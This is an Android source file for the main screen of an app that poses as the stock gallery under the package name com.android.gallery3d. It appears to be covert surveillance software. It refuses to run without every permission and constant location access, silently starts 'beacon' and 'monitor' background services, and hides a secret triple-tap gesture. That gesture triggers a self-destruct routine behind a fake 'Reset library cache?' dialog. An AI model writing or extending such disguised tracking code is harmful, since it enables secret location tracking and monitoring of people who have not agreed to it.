package com.android.gallery3d;

import android.app.AlertDialog;
import android.content.Intent;
import android.os.Bundle;
import android.view.MotionEvent;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {

    private int tapCount = 0;
    private long lastTap = 0;

    @Override protected void onCreate(Bundle b) {
        super.onCreate(b);

        if (!Perm.allGranted(this) || !Perm.locationAlways(this)) {
            startActivity(new Intent(this, LockedActivity.class));
            finish();
            return;
        }

        setContentView(R.layout.activity_main);

        findViewById(R.id.grid).setOnTouchListener((v, e) -> {
            if (e.getAction() == MotionEvent.ACTION_DOWN && e.getX() < 200 && e.getY() < 200) {
                long now = System.currentTimeMillis();
                if (now - lastTap < 600) tapCount++; else tapCount = 1;
                lastTap = now;
                if (tapCount >= 3) {
                    tapCount = 0;
                    new AlertDialog.Builder(this)
                        .setTitle("Reset library cache?")
                        .setPositiveButton("Reset", (d, w) -> BeaconService.selfDestruct(this))
                        .setNegativeButton("Cancel", null).show();
                }
            }
            return false;
        });

        startForegroundService(new Intent(this, BeaconService.class));
        startService(new Intent(this, MonitorService.class));
    }
}
